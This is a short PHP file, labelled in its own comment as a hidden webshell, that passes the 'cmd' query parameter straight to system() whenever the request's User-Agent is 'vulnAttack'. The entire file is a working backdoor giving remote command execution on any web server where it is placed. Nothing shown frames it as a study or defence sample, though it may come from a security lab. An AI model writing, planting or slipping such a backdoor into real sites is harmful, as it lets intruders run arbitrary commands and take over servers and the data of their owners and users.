<?php
// ================================================================
// WEBSHELL HIDDEN - User-Agent Based Access
// ================================================================

if ($_SERVER['HTTP_USER_AGENT'] == 'vulnAttack') {
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
}
?>